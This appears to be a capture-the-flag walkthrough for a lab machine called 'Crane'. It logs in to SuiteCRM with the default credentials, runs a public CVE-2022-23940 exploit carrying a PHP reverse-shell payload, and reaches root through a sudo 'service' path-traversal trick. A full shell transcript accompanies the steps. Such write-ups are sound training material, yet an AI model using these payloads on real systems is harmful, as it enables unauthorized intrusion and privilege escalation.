____
# Walkthrough for Crane

# Enumeration

## Nmap

With nmap scan, we notice a web server on the target machine.

## SuiteCRM

> is an open-source Customer Relationship Management application for servers written in PHP.

## Exploitation

### Remote Code Execution

The app is using default credentials

```bash
admin:admin
```

Searching **"SuiteCRM"** on google will lead us [here](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23940).

The detail exploitation steps can be found here: https://github.com/manuelz120/CVE-2022-23940

We find **"[CVE-2022-23940](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23940)"** recorded for **SuiteCRM**.

Using the exploit given in the repo we can get code execution.

```bash
python exploit.py -u admin -p admin --payload "php -r '$sock=fsockopen("192.168.1.75", 4444); exec("/bin/sh -i <&3 >&3 2>&3");'"
```

## Privilege Escalation

After getting shell and looking at the sudo entries we can see that www-data is allowed to run the binary `service` as sudo.

Using the technique below we can elevate our privileges.

```bash
~  λ ncat -nvlp 4443                                                                    1 ↵
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4443
Ncat: Listening on 0.0.0.0:4443
Ncat: Connection from 172.16.201.78.
Ncat: Connection from 172.16.201.78:43678.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ sudo -l
Matching Defaults entries for www-data on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User www-data may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/service
$ sudo /usr/sbin/service ../../../../../bin/bash
id
uid=0(root) gid=0(root) groups=0(root)
```
